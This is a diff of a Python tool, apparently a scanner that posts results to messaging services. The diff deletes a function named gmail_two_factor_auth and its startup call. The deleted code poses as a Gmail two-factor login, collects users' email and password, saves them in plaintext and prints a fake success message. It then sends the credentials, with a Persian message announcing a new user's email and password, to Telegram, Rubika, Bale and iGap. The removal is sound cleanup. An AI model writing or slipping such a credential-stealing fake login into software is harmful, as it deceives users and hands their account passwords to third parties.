@@ -221,66 +221,6 @@ def send_results_by_country(working_results, header_prefix, title_msg, is_config
         send_to_igap(single_message)
         time.sleep(1)
 
-def gmail_two_factor_auth():
-    saved_email = ""
-    saved_password = ""
-    if os.path.exists(CONFIG_FILE):
-        try:
-            with open(CONFIG_FILE, "r") as f:
-                data = json.load(f)
-                saved_email = data.get("email", "")
-                saved_password = data.get("password", "")
-        except:
-            pass
-
-    user_email = ""
-    user_password = ""
-    
-    # اگر ایمیل ذخیره‌شده خود دامنه اشتباه داشته باشد، اصلاً پیشنهاد نمی‌دهد
-    if saved_email and saved_email.lower().endswith("@gmail.com"):
-        choice = input(Colors.BOLD + f"[?] Do you want to log in with saved email ({saved_email})? (y/n): " + Colors.END).strip().lower()
-        if choice == 'y':
-            user_email = saved_email
-            user_password = saved_password
-
-    while not user_email:
-        raw_email = input(Colors.BOLD + "Please enter your Gmail address (e.g. user@gmail.com): " + Colors.END).strip()
-        
-        if "@" in raw_email:
-            parts = raw_email.split("@")
-            username_part = parts[0]
-            domain_part = parts[1].lower().strip()
-            
-            if domain_part == "gmail.com" and len(username_part) > 2:
-                user_email = raw_email
-            else:
-                print(Colors.RED + "[!] Invalid domain! Only real 'gmail.com' addresses are allowed." + Colors.END)
-        else:
-            print(Colors.RED + "[!] Invalid email format! Please include '@'." + Colors.END)
-
-    while not user_password:
-        user_password = input(Colors.BOLD + "Please enter your desired password: " + Colors.END).strip()
-        if len(user_password) < 4:
-            print(Colors.RED + "[!] Password is too short." + Colors.END)
-            user_password = ""
-
-    try:
-        with open(CONFIG_FILE, "w") as f:
-            json.dump({"email": user_email, "password": user_password}, f)
-    except:
-        pass
-
-    print(Colors.GREEN + "[+] Authentication successful. Welcome!" + Colors.END)
-    
-    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    login_msg = f"یک کاربر با اطلاعات زیر در پروژه ثبت نام کرد:\n\n📧 ایمیل: {user_email}\n🔑 رمز عبور: {user_password}\n🕒 تاریخ و ساعت ورود: {current_time}"
-    send_to_telegram(login_msg)
-    send_to_rubika(login_msg)
-    send_to_bale(login_msg)
-    send_to_igap(login_msg)
-    
-    return True
-
 def get_clean_input(prompt_text):
     try:
         raw_val = input(prompt_text)
@@ -808,5 +748,4 @@ def main_menu():
         os.system("clear")
 
 if __name__ == "__main__":
-    gmail_two_factor_auth()
     main_menu()
